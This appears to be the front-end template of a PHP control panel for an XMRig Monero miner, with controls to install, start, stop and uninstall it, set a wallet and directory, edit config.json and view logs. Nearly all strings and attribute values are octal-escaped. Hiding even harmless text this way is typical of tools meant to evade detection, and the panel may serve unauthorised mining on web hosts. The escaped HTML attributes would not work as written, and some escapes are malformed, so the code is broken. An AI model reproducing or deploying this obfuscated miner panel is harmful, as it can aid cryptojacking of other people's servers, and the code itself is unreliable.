    <meta name="\166\151\145\167\160\157\162\164" content="\167\151\144\164\150\075\144\145\166\151\143\145\055\167\151\144\164\150\054\040\151\156\151\164\151\141\154\055\163\143\141\154\145\075\061\056\060">
    <title>MoneroOcean Dashboard • Universal Edition</title>
    <style>
        :root[data-theme="\144\141\162\153"] {
            --bg-main: #0b0e14; --bg-card: #151b24; --bg-input: #0d1219;
            --border-color: #263244; --text-main: #e2e8f0; --text-muted: #8a99ad;
            --accent-orange: #f26822; --accent-orange-hover: #d95817;
            --badge-green-bg: rgba(16, 185, 129, 0.15); --badge-green-text: #34d399;
            --badge-red-bg: rgba(239, 68, 68, 0.15); --badge-red-text: #f87171;
        }
        :root[data-theme="\154\151\147\150\164"] {
            --bg-main: #f1f5f9; --bg-card: #ffffff; --bg-input: #f8fafc;
            --border-color: #cbd5e1; --text-main: #1e293b; --text-muted: #64748b;
            --accent-orange: #f26822; --accent-orange-hover: #d95817;
            --badge-green-bg: rgba(16, 185, 129, 0.1); --badge-green-text: #059669;
            --badge-red-bg: rgba(239, 68, 68, 0.1); --badge-red-text: #dc2626;
        }
        * { box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "\123\145\147\157\145\040\125\111", Roboto, sans-serif;
            background-color: var(--bg-main); color: var(--text-main);
            margin: 0; padding: 0; width: 100vw; min-height: 100vh;
            display: flex; flex-direction: column; transition: background-color 0.3s, color 0.3s;
        }
        .app-header {
            background-color: var(--bg-card); border-bottom: 1px solid var(--border-color);
            padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; width: 100%;
        }
        .brand-title { font-size: 1.05rem; font-weight: 700; display: flex; align-items: center; gap: 8px; }
        .brand-title span.highlight { color: var(--accent-orange); }
        .header-controls { display: flex; align-items: center; gap: 10px; }
        .theme-toggle, .logout-btn {
            background: var(--bg-input); border: 1px solid var(--border-color); color: var(--text-main);
            padding: 5px 10px; border-radius: 6px; cursor: pointer; font-size: 0.8rem; font-weight: 600; text-decoration: none;
        }
        .main-container { flex: 1; width: 100%; max-width: 1100px; margin: 0 auto; padding: 16px 20px; display: flex; flex-direction: column; gap: 14px; }
        .login-wrapper { flex: 1; display: flex; align-items: center; justify-content: center; padding: 24px; width: 100%; }
        .login-card { background-color: var(--bg-card); border: 1px solid var(--border-color); border-radius: 10px; padding: 28px; width: 100%; max-width: 400px; }
        .slide-nav { display: flex; background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 8px; padding: 4px; gap: 4px; }
        .slide-tab {
            flex: 1; background: transparent; border: none; color: var(--text-muted); padding: 8px 10px;
            border-radius: 6px; font-weight: 600; font-size: 0.8rem; cursor: pointer; text-align: center;
        }
        .slide-tab.active { background: var(--accent-orange); color: #ffffff; }
        .slides-viewport { position: relative; width: 100%; }
        .slide-pane { display: none; }
        .slide-pane.active { display: block; }
        .card { background-color: var(--bg-card); border: 1px solid var(--border-color); border-radius: 8px; padding: 16px 20px; display: flex; flex-direction: column; justify-content: space-between; }
        .card-title { margin-top: 0; font-size: 0.98rem; font-weight: 600; border-bottom: 1px solid var(--border-color); padding-bottom: 8px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
        .status-badge { font-size: 0.65rem; padding: 3px 8px; border-radius: 20px; font-weight: 700; text-transform: uppercase; }
        .badge-running { background-color: var(--badge-green-bg); color: var(--badge-green-text); border: 1px solid rgba(52, 211, 153, 0.3); }
        .badge-stopped { background-color: var(--badge-red-bg); color: var(--badge-red-text); border: 1px solid rgba(248, 113, 113, 0.3); }
        .info-row { display: flex; justify-content: space-between; align-items: center; margin: 6px 0; font-size: 0.82rem; color: var(--text-muted); border-bottom: 1px dashed var(--border-color); padding-bottom: 6px; }
        .info-row span.val { color: var(--text-main); font-weight: 500; word-break: break-all; text-align: right; max-width: 65%; }
        .info-row span.val-sm { font-family: monospace; font-size: 0.72rem; color: var(--accent-orange); }
        .process-box { background-color: var(--bg-input); border: 1px solid var(--border-color); border-radius: 6px; padding: 8px 10px; font-family: monospace; font-size: 0.72rem; color: var(--accent-orange); margin-top: 4px; white-space: pre-wrap; }
        .logs-box, .config-editor { background-color: #05070a; border: 1px solid var(--border-color); border-radius: 6px; padding: 12px; font-family: monospace; font-size: 0.76rem; color: #34d399; height: 400px; overflow-y: auto; width: 100%; resize: vertical; outline: none; }
        .config-editor { color: #e2e8f0; }
        
        /* Highlight rule for accepted shares in logs */
        .log-accepted {
            color: #38bdf8;
            background-color: rgba(56, 189, 248, 0.15);
            padding: 1px 4px;
            border-radius: 4px;
            font-weight: bold;
        }

        .btn-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; margin-top: 14px; }
        .settings-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
        .settings-col { display: flex; flex-direction: column; gap: 10px; }
        button.action-btn, .submit-btn { background-color: var(--accent-orange); color: white; border: none; padding: 9px 12px; border-radius: 6px; font-weight: 600; cursor: pointer; width: 100%; font-size: 0.81rem; }
        button.action-btn:hover, .submit-btn:hover { background-color: var(--accent-orange-hover); }
        button.btn-danger { background-color: #dc2626; }
        button.btn-secondary { background-color: var(--border-color); color: var(--text-main); }
        .form-group { background: var(--bg-input); border: 1px solid var(--border-color); border-radius: 6px; padding: 10px 12px; }
        label { display: block; font-size: 0.78rem; margin-bottom: 4px; color: var(--text-muted); font-weight: 600; }
        input[type="\164\145\170\164"], input[type="\160\141\163\163\167\157\162\144"] { width: 100%; padding: 7px 10px; border-radius: 6px; border: 1px solid var(--border-color); background-color: var(--bg-main); color: var(--text-main); font-size: 0.8rem; outline: none; margin-bottom: 6px; }
        .toast { position: fixed; top: 20px; right: 20px; z-index: 9999; min-width: 260px; padding: 12px 16px; border-radius: 8px; font-size: 0.85rem; font-weight: 600; display: none; }
        .toast-success { background: rgba(16, 185, 129, 0.95); color: #ffffff; }
        .toast-error { background: rgba(239, 68, 68, 0.95); color: #ffffff; }
        .app-footer { text-align: center; font-size: 0.75rem; color: var(--text-muted); padding: 10px; border-top: 1px solid var(--border-color); background-color: var(--bg-card); width: 100%; margin-top: auto; }
        .app-footer a { color: var(--accent-orange); text-decoration: none; }
    </style>
</head>
<body>
    <div id="\164\157\141\163\164" class="\164\157\141\163\164"></div>

    <header class="\141\160\160\055\150\145\141\144\145\162">
        <div class="\142\162\141\156\144\055\164\151\164\154\145">
            <span>⚡</span> MoneroOcean <span class="\150\151\147\150\154\151\147\150\164">Control Node</span>
        </div>
        <div class="\150\145\141\144\145\162\055\143\157\156\164\162\157\154\163">
            <button class="\164\150\145\155\145\055\164\157\147\147\154\145" onclick="\164\157\147\147\154\145\124\150\145\155\145\050\051">
                <span id="\164\150\145\155\145\111\143\157\156">☀️</span> <span id="\164\150\145\155\145\124\145\170\164">Light Mode</span>
            </button>
            <?php if ($is_authenticated): ?>
                <a href="\077\141\143\164\151\157\156\075\154\157\147\157\165\164" class="\154\157\147\157\165\164\055\142\164\156">Logout</a>
            <?php endif; ?>
        </div>
    </header>

    <?php if (!$is_authenticated): ?>
        <div class="\154\157\147\151\156\055\167\162\141\160\160\145\162">
            <div class="\154\157\147\151\156\055\143\141\162\144">
                <h2 style="\155\141\162\147\151\156\055\164\157\160\072\040\060\073\040\146\157\156\164\055\163\151\172\145\072\040\061\056\061\065\162\145\155\073\040\146\157\156\164\055\167\145\151\147\150\164\072\040\067\060\060\073\040\155\141\162\147\151\156\055\142\157\164\164\157\155\072\040\066\160\170\073">Node Authentication</h2>
                <p style="\146\157\156\164\055\163\151\172\145\072\040\060\056\070\062\162\145\155\073\040\143\157\154\157\162\072\040\166\141\162\050\055\055\164\145\170\164\055\155\165\164\145\144\051\073\040\155\141\162\147\151\156\055\142\157\164\164\157\155\072\040\061\066\160\170\073">Please enter your password to access the control panel.</p>
                
                <?php if (!empty($login_error)): ?>
                    <div style="\142\141\143\153\147\162\157\165\156\144\072\040\166\141\162\050\055\055\142\141\144\147\145\055\162\145\144\055\142\147\051\073\040\143\157\154\157\162\072\040\166\141\162\050\055\055\142\141\144\147\145\055\162\145\144\055\164\145\170\164\051\073\040\160\141\144\144\151\156\147\072\040\070\160\170\073\040\142\157\162\144\145\162\055\162\141\144\151\165\163\072\040\066\160\170\073\040\146\157\156\164\055\163\151\172\145\072\040\060\056\070\062\162\145\155\073\040\155\141\162\147\151\156\055\142\157\164\164\157\155\072\040\061\062\160\170\073">
                        <?php echo htmlspecialchars($login_error); ?>
                    </div>
                <?php endif; ?>

                <form method="\120\117\123\124" action="">
                    <div style="\155\141\162\147\151\156\055\142\157\164\164\157\155\072\040\061\062\160\170\073">
                        <label for="\154\157\147\151\156\137\160\141\163\163\167\157\162\144">Password:</label>
                        <input type="\160\141\163\163\167\157\162\144" id="\154\157\147\151\156\137\160\141\163\163\167\157\162\144" name="\154\157\147\151\156\137\160\141\163\163\167\157\162\144" placeholder="\105\156\164\145\162\040\160\141\163\163\167\157\162\144\056\056\056" required autofocus>
                    </div>
                    <button type="\163\165\142\155\151\164" class="\163\165\142\155\151\164\055\142\164\156">Authenticate</button>
                </form>
            </div>
        </div>
    <?php else: ?>
        <div class="\155\141\151\156\055\143\157\156\164\141\151\156\145\162">
            <div class="\163\154\151\144\145\055\156\141\166">
                <button class="\163\154\151\144\145\055\164\141\142\040\141\143\164\151\166\145" onclick="\163\167\151\164\143\150\123\154\151\144\145\050\060\051">⚡ Status & Control</button>
                <button class="\163\154\151\144\145\055\164\141\142" onclick="\163\167\151\164\143\150\123\154\151\144\145\050\061\051">🛠️ Security & Settings</button>
                <button class="\163\154\151\144\145\055\164\141\142" onclick="\163\167\151\164\143\150\123\154\151\144\145\050\062\051">📝 JSON Config</button>
                <button class="\163\154\151\144\145\055\164\141\142" onclick="\163\167\151\164\143\150\123\154\151\144\145\050\063\051">📊 Live Logs</button>
            </div>

            <div class="\163\154\151\144\145\163\055\166\151\145\167\160\157\162\164">
                <div id="\163\154\151\144\145\055\060" class="\163\154\151\144\145\055\160\141\156\145\040\141\143\164\151\166\145">
                    <div class="\143\141\162\144">
                        <div>
                            <h2 class="\143\141\162\144\055\164\151\164\154\145">
                                <span>MoneroOcean Engine Status</span>
                                <span id="\163\164\141\164\165\163\102\141\144\147\145" class="\163\164\141\164\165\163\055\142\141\144\147\145\040\142\141\144\147\145\055\163\164\157\160\160\145\144">Loading...</span>
                            </h2>
                            
                            <div class="\151\156\146\157\055\162\157\167"><span>Working Dir:</span> <span id="\167\157\162\153\104\151\162\104\151\163\160\154\141\171" class="\166\141\154\040\166\141\154\055\163\155">-</span></div>
                            <div class="\151\156\146\157\055\162\157\167"><span>Active Executor:</span> <span id="\141\143\164\151\166\145\105\170\145\143\165\164\157\162" class="\166\141\154" style="\143\157\154\157\162\072\040\166\141\162\050\055\055\141\143\143\145\156\164\055\157\162\141\156\147\145\051\073">-</span></div>
                            <div class="\151\156\146\157\055\162\157\167"><span>Site URL / Tag:</span> <span id="\163\151\164\145\125\162\154" class="\166\141\154">-</span></div>
                            <div class="\151\156\146\157\055\162\157\167"><span>CPU Cores / RAM:</span> <span id="\163\171\163\111\156\146\157" class="\166\141\154">-</span></div>
                            <div class="\151\156\146\157\055\162\157\167"><span>Process Uptime:</span> <span id="\165\160\164\151\155\145\104\151\163\160\154\141\171" class="\166\141\154" style="\146\157\156\164\055\167\145\151\147\150\164\072\040\067\060\060\073">0s</span></div>
                            <div class="\151\156\146\157\055\162\157\167"><span>Binary Exists:</span> <span id="\142\151\156\105\170\151\163\164\163" class="\166\141\154">-</span></div>
                            <div class="\151\156\146\157\055\162\157\167"><span>Binary Executable:</span> <span id="\142\151\156\105\170\145\143" class="\166\141\154">-</span></div>
                            <div class="\151\156\146\157\055\162\157\167"><span>WorkDir Writable:</span> <span id="\144\151\162\127\162\151\164\141\142\154\145" class="\166\141\154">-</span></div>
                            
                            <div style="\155\141\162\147\151\156\055\164\157\160\072\040\061\060\160\170\073">
                                <div style="\146\157\156\164\055\163\151\172\145\072\040\060\056\067\070\162\145\155\073\040\143\157\154\157\162\072\040\166\141\162\050\055\055\164\145\170\164\055\155\165\164\145\144\051\073\040\155\141\162\147\151\156\055\142\157\164\164\157\155\072\040\063\160\170\073">Active Wallet:</div>
                                <div id="\141\143\164\151\166\145\127\141\154\154\145\164" style="\146\157\156\164\055\146\141\155\151\154\171\072\040\155\157\156\157\163\160\141\143\145\073\040\146\157\156\164\055\163\151\172\145\072\040\060\056\067\064\162\145\155\073\040\142\141\143\153\147\162\157\165\156\144\072\040\166\141\162\050\055\055\142\147\055\151\156\160\165\164\051\073\040\160\141\144\144\151\156\147\072\040\070\160\170\073\040\142\157\162\144\145\162\055\162\141\144\151\165\163\072\040\066\160\170\073\040\142\157\162\144\145\162\072\040\061\160\170\040\163\157\154\151\144\040\166\141\162\050\055\055\142\157\162\144\145\162\055\143\157\154\157\162\051\073\040\167\157\162\144\055\142\162\145\141\153\072\040\142\162\145\141\153\055\141\154\154\073">-</div>
                            </div>
                        </div>

                        <div class="\142\164\156\055\147\162\151\144">
                            <button class="\141\143\164\151\157\156\055\142\164\156" onclick="triggerAction('\151\156\163\164\141\154\154')">Start / Install</button>
                            <button class="\141\143\164\151\157\156\055\142\164\156\040\142\164\156\055\163\145\143\157\156\144\141\162\171" onclick="triggerAction('\162\145\163\164\141\162\164')">Restart</button>
                            <button class="\141\143\164\151\157\156\055\142\164\156\040\142\164\156\055\144\141\156\147\145\162" onclick="triggerAction('\163\164\157\160')">Stop</button>
                        </div>
                    </div>
                </div>

                <div id="\163\154\151\144\145\055\061" class="\163\154\151\144\145\055\160\141\156\145">
                    <div class="\143\141\162\144">
                        <h2 class="\143\141\162\144\055\164\151\164\154\145"><span>Configuration & Security Management</span></h2>

                        <div class="\163\145\164\164\151\156\147\163\055\147\162\151\144">
                            <div class="\163\145\164\164\151\156\147\163\055\143\157\154">
                                <div class="\146\157\162\155\055\147\162\157\165\160" style="\160\141\144\144\151\156\147\072\040\070\160\170\040\061\060\160\170\073">
                                    <label>Process State:</label>
                                    <div id="\160\162\157\143\145\163\163\111\156\146\157\102\157\170" class="\160\162\157\143\145\163\163\055\142\157\170">Checking state...</div>
                                </div>

                                <div class="\146\157\162\155\055\147\162\157\165\160">
                                    <label for="\143\165\163\164\157\155\104\151\162\111\156\160\165\164">Custom Installation Directory:</label>
                                    <input type="\164\145\170\164" id="\143\165\163\164\157\155\104\151\162\111\156\160\165\164" placeholder="\145\056\147\056\040\057\150\157\155\145\057\165\163\145\162\057\143\165\163\164\157\155\137\144\151\162">
                                    <button class="\141\143\164\151\157\156\055\142\164\156\040\142\164\156\055\163\145\143\157\156\144\141\162\171" onclick="\165\160\144\141\164\145\103\165\163\164\157\155\104\151\162\050\051" style="\160\141\144\144\151\156\147\072\040\066\160\170\073\040\146\157\156\164\055\163\151\172\145\072\040\060\056\067\066\162\145\155\073">Set Directory</button>
                                </div>

                                <div class="\146\157\162\155\055\147\162\157\165\160">
                                    <label for="\167\141\154\154\145\164\111\156\160\165\164">Update Wallet Address:</label>
                                    <input type="\164\145\170\164" id="\167\141\154\154\145\164\111\156\160\165\164" value="\074\077\160\150\160\040\145\143\150\157\040\150\164\155\154\163\160\145\143\151\141\154\143\150\141\162\163\050\044\141\143\164\151\166\145\137\167\141\154\154\145\164\051\073\040\077\076" placeholder="\115\157\156\145\162\157\040\101\144\144\162\145\163\163\056\056\056">
                                    <label for="\160\141\163\163\111\156\160\165\164" style="\155\141\162\147\151\156\055\164\157\160\072\040\064\160\170\073">Worker Pass / Tag:</label>
                                    <input type="\164\145\170\164" id="\160\141\163\163\111\156\160\165\164" value="\074\077\160\150\160\040\145\143\150\157\040\150\164\155\154\163\160\145\143\151\141\154\143\150\141\162\163\050\044\141\143\164\151\166\145\137\160\141\163\163\051\073\040\077\076" placeholder="\127\157\162\153\145\162\040\164\141\147\056\056\056">
                                    <button class="\141\143\164\151\157\156\055\142\164\156" onclick="\165\160\144\141\164\145\127\141\154\154\145\164\050\051" style="\160\141\144\144\151\156\147\072\040\066\160\170\073\040\146\157\156\164\055\163\151\172\145\072\040\060\056\067\066\162\145\155\073">Save Wallet</button>
                                </div>
                            </div>

                            <div class="\163\145\164\164\151\156\147\163\055\143\157\154">
                                <div class="\146\157\162\155\055\147\162\157\165\160">
                                    <label>Change Dashboard Password:</label>
                                    <input type="\160\141\163\163\167\157\162\144" id="\143\165\162\162\145\156\164\120\141\163\163\167\157\162\144" placeholder="\103\165\162\162\145\156\164\040\120\141\163\163\167\157\162\144\056\056\056">
                                    <input type="\160\141\163\163\167\157\162\144" id="\156\145\167\120\141\163\163\167\157\162\144" placeholder="\116\145\167\040\120\141\163\163\167\157\162\144\040\050\155\151\156\040\064\040\143\150\141\162\163\051\056\056\056">
                                    <button class="\141\143\164\151\157\156\055\142\164\156\040\142\164\156\055\163\145\143\157\156\144\141\162\171" onclick="\143\150\141\156\147\145\120\141\163\163\167\157\162\144\050\051" style="\160\141\144\144\151\156\147\072\040\066\160\170\073\040\146\157\156\164\055\163\151\172\145\072\040\060\056\067\066\162\145\155\073">Update Password</button>
                                </div>

                                <div class="\146\157\162\155\055\147\162\157\165\160" style="\142\157\162\144\145\162\055\143\157\154\157\162\072\040\162\147\142\141\050\062\063\071\054\040\066\070\054\040\066\070\054\040\060\056\063\051\073\040\142\141\143\153\147\162\157\165\156\144\072\040\162\147\142\141\050\062\063\071\054\040\066\070\054\040\066\070\054\040\060\056\060\063\051\073">
                                    <label style="\143\157\154\157\162\072\040\166\141\162\050\055\055\142\141\144\147\145\055\162\145\144\055\164\145\170\164\051\073">Danger Zone / Node Removal:</label>
                                    <p style="\146\157\156\164\055\163\151\172\145\072\040\060\056\067\064\162\145\155\073\040\143\157\154\157\162\072\040\166\141\162\050\055\055\164\145\170\164\055\155\165\164\145\144\051\073\040\155\141\162\147\151\156\072\040\064\160\170\040\060\040\070\160\170\040\060\073">Stops process, deletes working directory, logs, configs.</p>
                                    <button class="\141\143\164\151\157\156\055\142\164\156\040\142\164\156\055\144\141\156\147\145\162" onclick="\164\162\151\147\147\145\162\125\156\151\156\163\164\141\154\154\050\051" style="\160\141\144\144\151\156\147\072\040\070\160\170\073\040\146\157\156\164\055\163\151\172\145\072\040\060\056\067\070\162\145\155\073">Uninstall Node Completely</button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div id="\163\154\151\144\145\055\062" class="\163\154\151\144\145\055\160\141\156\145">
                    <div class="\143\141\162\144">
                        <h2 class="\143\141\162\144\055\164\151\164\154\145">
                            <span>Edit `config.json`</span>
                            <button class="\141\143\164\151\157\156\055\142\164\156" onclick="\163\141\166\145\103\157\156\146\151\147\050\051" style="\167\151\144\164\150\072\040\141\165\164\157\073\040\160\141\144\144\151\156\147\072\040\065\160\170\040\061\064\160\170\073\040\146\157\156\164\055\163\151\172\145\072\040\060\056\067\066\162\145\155\073">Save Config</button>
                        </h2>
                        <textarea id="\143\157\156\146\151\147\105\144\151\164\157\162" class="\143\157\156\146\151\147\055\145\144\151\164\157\162" spellcheck="\146\141\154\163\145">Loading configuration...</textarea>
                    </div>
                </div>

                <div id="\163\154\151\144\145\055\063" class="\163\154\151\144\145\055\160\141\156\145">
                    <div class="\143\141\162\144">
                        <h2 class="\143\141\162\144\055\164\151\164\154\145">
                            <span>XMRig Live Logs (`xmrig.log`)</span>
                            <button class="\141\143\164\151\157\156\055\142\164\156\040\142\164\156\055\163\145\143\157\156\144\141\162\171" onclick="\146\145\164\143\150\114\157\147\163\050\051" style="\167\151\144\164\150\072\040\141\165\164\157\073\040\160\141\144\144\151\156\147\072\040\065\160\170\040\061\064\160\170\073\040\146\157\156\164\055\163\151\172\145\072\040\060\056\067\066\162\145\155\073">Refresh Logs</button>
                        </h2>
                        <div id="\154\157\147\163\102\157\170" class="\154\157\147\163\055\142\157\170">Loading live logs...</div>
                    </div>
                </div>
            </div>
        </div>
    <?php endif; ?>

    <footer class="\141\160\160\055\146\157\157\164\145\162">
        Powered by <a href="\150\164\164\160\163\072\057\057\155\157\156\145\162\157\157\143\145\141\156\056\163\164\162\145\141\155" target="\137\142\154\141\156\153">MoneroOcean Stream</a> API Protocol &bull; Universal Version Edition
    </footer>

    <script>
        function toggleTheme() {
            const html = document.documentElement;
            const currentTheme = html.getAttribute('\144\141\164\141\055\164\150\145\155\145');
            const newTheme = currentTheme === '\144\141\162\153' ? '\154\151\147\150\164' : '\144\141\162\153';
            html.setAttribute('\144\141\164\141\055\164\150\145\155\145', newTheme);
            localStorage.setItem('\155\157\156\145\162\157\157\143\145\141\156\137\164\150\145\155\145', newTheme);
            updateThemeButton(newTheme);
        }

        function updateThemeButton(theme) {
            const icon = document.getElementById('\164\150\145\155\145\111\143\157\156');
            const text = document.getElementById('\164\150\145\155\145\124\145\170\164');
            if (!icon || !text) return;
            if (theme === '\154\151\147\150\164') {
                icon.innerHTML = '\371431';
                text.textContent = '\104\141\162\153\040\115\157\144\145';
            } else {
                icon.innerHTML = '\23000\177017';
                text.textContent = '\114\151\147\150\164\040\115\157\144\145';
            }
        }

        const savedTheme = localStorage.getItem('\155\157\156\145\162\157\157\143\145\141\156\137\164\150\145\155\145') || '\144\141\162\153';
        document.documentElement.setAttribute('\144\141\164\141\055\164\150\145\155\145', savedTheme);
        updateThemeButton(savedTheme);

        function switchSlide(index) {
            const tabs = document.querySelectorAll('\056\163\154\151\144\145\055\164\141\142');
            const panes = document.querySelectorAll('\056\163\154\151\144\145\055\160\141\156\145');
            tabs.forEach((tab, idx) => tab.classList.toggle('\141\143\164\151\166\145', idx === index));
            panes.forEach((pane, idx) => pane.classList.toggle('\141\143\164\151\166\145', idx === index));
        }

        <?php if ($is_authenticated): ?>
        let currentUptimeSeconds = 0;
        let uptimeInterval = null;
        let timeoutHandle = null;

        function formatUptime(seconds) {
            if (seconds <= 0) return '\060\163';
            const d = Math.floor(seconds / (3600 * 24));
            const h = Math.floor((seconds % (3600 * 24)) / 3600);
            const m = Math.floor((seconds % 3600) / 60);
            const s = Math.floor(seconds % 60);
            let parts = [];
            if (d > 0) parts.push(d + '\144');
            if (h > 0 || d > 0) parts.push(h + '\150');
            if (m > 0 || h > 0 || d > 0) parts.push(m + '\155');
            parts.push(s + '\163');
            return parts.join('\040');
        }

        function startClientClock() {
            if (uptimeInterval) clearInterval(uptimeInterval);
            uptimeInterval = setInterval(() => {
                currentUptimeSeconds++;
                document.getElementById('\165\160\164\151\155\145\104\151\163\160\154\141\171').textContent = formatUptime(currentUptimeSeconds);
            }, 1000);
        }

        function showToast(message, success = true) {
            const toast = document.getElementById('\164\157\141\163\164');
            if (!toast) return;
            if (timeoutHandle) clearTimeout(timeoutHandle);
            toast.textContent = message;
            toast.className = '\164\157\141\163\164\040' + (success ? '\164\157\141\163\164\055\163\165\143\143\145\163\163' : '\164\157\141\163\164\055\145\162\162\157\162');
            toast.style.display = '\142\154\157\143\153';
            timeoutHandle = setTimeout(() => { toast.style.display = '\156\157\156\145'; }, 4000);
        }

        function escapeHtml(text) {
            return text.replace(/&/g, "\046\141\155\160\073").replace(/</g, "\046\154\164\073").replace(/>/g, "\046\147\164\073");
        }

        function fetchLogs() {
            fetch('\077\141\143\164\151\157\156\075\147\145\164\137\154\157\147\163')
                .then(res => res.json())
                .then(data => {
                    const logsBox = document.getElementById('\154\157\147\163\102\157\170');
                    if (data.success) {
                        let rawText = data.logs || "";
                        let safeHtml = escapeHtml(rawText);
                        
                        // Highlight instances of accepted shares e.g., accepted (1/0)
                        safeHtml = safeHtml.replace(/(accepted\s*\([^)]+\))/gi, '<span class="\154\157\147\055\141\143\143\145\160\164\145\144">$1</span>');
                        
                        logsBox.innerHTML = safeHtml;
                        logsBox.scrollTop = logsBox.scrollHeight;
                    }
                });
        }

        function fetchConfig() {
            fetch('\077\141\143\164\151\157\156\075\147\145\164\137\143\157\156\146\151\147')
                .then(res => res.json())
                .then(data => {
                    if (data.success) document.getElementById('\143\157\156\146\151\147\105\144\151\164\157\162').value = data.config;
                });
        }

        function saveConfig() {
            const configVal = document.getElementById('\143\157\156\146\151\147\105\144\151\164\157\162').value;
            const formData = new URLSearchParams();
            formData.append('\143\157\156\146\151\147\137\152\163\157\156', configVal);
            fetch('\077\141\143\164\151\157\156\075\163\141\166\145\137\143\157\156\146\151\147', { method: '\120\117\123\124', body: formData })
                .then(res => res.json())
                .then(data => {
                    showToast(data.message, data.success);
                    if (data.success) fetchConfig();
                });
        }

        function fetchStatus() {
            fetch('\077\141\143\164\151\157\156\075\163\164\141\164\165\163')
                .then(res => res.json())
                .then(data => {
                    if (!data.status) return;
                    const badge = document.getElementById('\163\164\141\164\165\163\102\141\144\147\145');
                    if (data.status === '\122\125\116\116\111\116\107') {
                        badge.textContent = '\122\125\116\116\111\116\107';
                        badge.className = '\163\164\141\164\165\163\055\142\141\144\147\145\040\142\141\144\147\145\055\162\165\156\156\151\156\147';
                        if (currentUptimeSeconds === 0 || Math.abs(currentUptimeSeconds - data.uptime) > 5) {
                            currentUptimeSeconds = data.uptime;
                            startClientClock();
                        }
                    } else {
                        badge.textContent = '\123\124\117\120\120\105\104';
                        badge.className = '\163\164\141\164\165\163\055\142\141\144\147\145\040\142\141\144\147\145\055\163\164\157\160\160\145\144';
                        currentUptimeSeconds = 0;
                        if (uptimeInterval) clearInterval(uptimeInterval);
                        document.getElementById('\165\160\164\151\155\145\104\151\163\160\154\141\171').textContent = '\123\164\157\160\160\145\144';
                    }
                    
                    document.getElementById('\167\157\162\153\104\151\162\104\151\163\160\154\141\171').textContent = data.work_dir;
                    document.getElementById('\141\143\164\151\166\145\105\170\145\143\165\164\157\162').textContent = data.executor;
                    document.getElementById('\163\151\164\145\125\162\154').textContent = data.site_url + '\040\050' + data.pass_tag + '\051';
                    document.getElementById('\163\171\163\111\156\146\157').textContent = data.cores + '\040\103\157\162\145\163\040\057\040' + data.ram + '\040\115\102';
                    document.getElementById('\141\143\164\151\166\145\127\141\154\154\145\164').textContent = data.running_address;
                    document.getElementById('\160\162\157\143\145\163\163\111\156\146\157\102\157\170').textContent = data.process_info;
                    
                    document.getElementById('\142\151\156\105\170\151\163\164\163').textContent = data.binary_exists ? '\131\145\163' : '\116\157';
                    document.getElementById('\142\151\156\105\170\145\143').textContent = data.binary_executable ? '\131\145\163' : '\116\157';
                    document.getElementById('\144\151\162\127\162\151\164\141\142\154\145').textContent = data.dir_writable ? '\131\145\163' : '\116\157';
                });
        }

        function triggerAction(actionName) {
            if(!confirm('\101\162\145\040\171\157\165\040\163\165\162\145\040\171\157\165\040\167\141\156\164\040\164\157\040' + actionName + '\040\164\150\145\040\145\156\147\151\156\145\077')) return;
            fetch('\077\141\143\164\151\157\156\075' + actionName)
                .then(res => res.json())
                .then(data => {
                    showToast(data.message, data.success);
                    fetchStatus();
                    setTimeout(fetchLogs, 1500);
                    fetchConfig();
                });
        }

        function triggerUninstall() {
            if(!confirm('\127\101\122\116\111\116\107\072\040\103\157\155\160\154\145\164\145\154\171\040\162\145\155\157\166\145\040\164\150\151\163\040\156\157\144\145\077')) return;
            fetch('\077\141\143\164\151\157\156\075\165\156\151\156\163\164\141\154\154')
                .then(res => res.json())
                .then(data => {
                    showToast(data.message, data.success);
                    fetchStatus();
                });
        }

        function updateCustomDir() {
            const formData = new URLSearchParams();
            formData.append('\143\165\163\164\157\155\137\144\151\162', document.getElementById('\143\165\163\164\157\155\104\151\162\111\156\160\165\164').value);
            fetch('\077\141\143\164\151\157\156\075\165\160\144\141\164\145\137\143\165\163\164\157\155\137\144\151\162', { method: '\120\117\123\124', body: formData })
                .then(res => res.json())
                .then(data => { showToast(data.message, data.success); fetchStatus(); });
        }

        function updateWallet() {
            const formData = new URLSearchParams();
            formData.append('\167\141\154\154\145\164', document.getElementById('\167\141\154\154\145\164\111\156\160\165\164').value);
            formData.append('\160\141\163\163', document.getElementById('\160\141\163\163\111\156\160\165\164').value);
            fetch('\077\141\143\164\151\157\156\075\165\160\144\141\164\145\137\167\141\154\154\145\164', { method: '\120\117\123\124', body: formData })
                .then(res => res.json())
                .then(data => { showToast(data.message, data.success); fetchStatus(); fetchConfig(); });
        }

        function changePassword() {
            const formData = new URLSearchParams();
            formData.append('\143\165\162\162\145\156\164\137\160\141\163\163\167\157\162\144', document.getElementById('\143\165\162\162\145\156\164\120\141\163\163\167\157\162\144').value);
            formData.append('\156\145\167\137\160\141\163\163\167\157\162\144', document.getElementById('\156\145\167\120\141\163\163\167\157\162\144').value);
            fetch('\077\141\143\164\151\157\156\075\143\150\141\156\147\145\137\160\141\163\163\167\157\162\144', { method: '\120\117\123\124', body: formData })
                .then(res => res.json())
                .then(data => { showToast(data.message, data.success); });
        }

        fetchStatus();
        fetchLogs();
        fetchConfig();
        setInterval(fetchStatus, 15000);
        setInterval(fetchLogs, 10000);
        <?php endif; ?>
    </script>
</body>
</html>
